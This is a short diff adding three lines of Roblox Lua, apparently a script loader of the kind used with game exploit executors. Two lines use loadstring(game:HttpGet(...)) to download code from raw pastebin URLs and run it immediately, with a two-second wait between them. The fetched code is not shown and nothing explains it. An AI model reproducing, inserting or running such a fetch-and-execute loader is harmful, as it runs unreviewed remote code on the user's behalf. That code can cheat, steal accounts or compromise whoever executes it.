@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/eB0W8iVb"))()
+wait(2)
+loadstring(game:HttpGet("https://pastebin.com/raw/tC6LwQhR"))()
